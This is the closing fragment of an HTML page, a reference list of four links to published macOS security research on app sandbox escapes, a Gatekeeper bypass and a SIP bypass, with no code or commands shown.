  <li>https://i.blackhat.com/EU-21/Wednesday/EU-21-Waisberg-Skeletons-In-The-App-Sandbox.pdf</li>
  <li>https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html</li>
  <li>https://breakpoint.sh/posts/bypassing-the-macos-gatekeeper</li>
  <li>https://jhftss.github.io/CVE-2022-26712-The-POC-For-SIP-Bypass-Is-Even-Tweetable/</li>
</ul>


  </div></div>
  </body>
</html>
